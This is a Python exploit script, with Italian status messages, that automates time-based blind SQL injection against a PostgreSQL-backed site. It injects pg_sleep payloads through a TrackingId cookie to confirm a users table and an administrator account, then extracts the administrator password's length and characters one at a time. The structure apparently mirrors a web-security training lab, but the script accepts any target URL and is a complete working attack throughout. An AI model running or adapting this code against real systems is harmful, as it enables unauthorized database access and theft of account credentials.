import requests
import sys
import urllib3
import urllib
from string import ascii_lowercase

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def perfom_request(url,sql_payload):
    sql_payload = urllib.parse.quote(sql_payload)
    cookies = {'TrackingId' : '8UiR5WOZiCeMXDOI' + sql_payload, 'session' : 'zLqWViEUE2kIvk2TswfV8oLe158p4rZK'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    response_time = r.elapsed.total_seconds()
    return int(response_time)


def sqli_userstable_exist(url):
    sql_payload = "' ; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--"
    response_time = perfom_request(url, sql_payload)
    if response_time > 4:
        print("[+] SQL Payload: %s" % sql_payload)
        print("[+] La tabella users esiste")
        return True
    print("[+] SQL Payload: %s" % sql_payload)
    print("[+] La tabella users non esiste")
    return False


def sqli_administrator_exit(url):
    sql_payload = "' ; SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--"
    response_time = perfom_request(url, sql_payload)
    if response_time > 4:
        print("[+] SQL Payload: %s" % sql_payload)
        print("[+] L'utente administrator esiste")
        return True
    print("[-] SQL Payload: %s" % sql_payload)
    print("[-] L'utente administrator non esiste")
    return False


def sqli_password_length(url):
    for i in range(1,50):
        sql_payload = "' ; SELECT CASE WHEN (username='administrator') AND LENGTH(password)>%i THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--" % i
        sys.stdout.write("[+] La password ha %s caratteri\r" % str(i))
        sys.stdout.flush()
        response_time = perfom_request(url, sql_payload)
        if response_time > 4:
            sys.stdout.write("[+] La password ha %s caratteri\r" % str(i))
            sys.stdout.flush()
        else:
            return i


def sqli_password_enumerator(url,password_length):
    admin_password = ""
    alc = ascii_lowercase
    for i in range(0,10):
        alc = alc + str(i)
    for j in range(1,password_length+1):
        for x in alc:
            sql_payload = "' ;SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{0},1)='{1}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--".format(j,x)
            response_time = perfom_request(url, sql_payload)
            if response_time > 4:
                admin_password += x
                sys.stdout.write("[+] La password di administrator è: %s\r" % admin_password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write("[+] La password di administrator è: {0}{1}\r".format(admin_password,x))
                sys.stdout.flush()



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()

    print("\n[+] Analizzando il database...\n")

    print("\n[+] Verificando che la tabella users esista")
    sqli_userstable_exist(url)

    print("\n[+] Verificando che l'utente administrator esista")
    sqli_administrator_exit(url)

    print("\n[+] Calcolando la lunghezza della password di administrator")
    password_length = sqli_password_length(url)

    print("\n[+] Enumerando la password")
    sqli_password_enumerator(url,password_length)

    print("\n\r")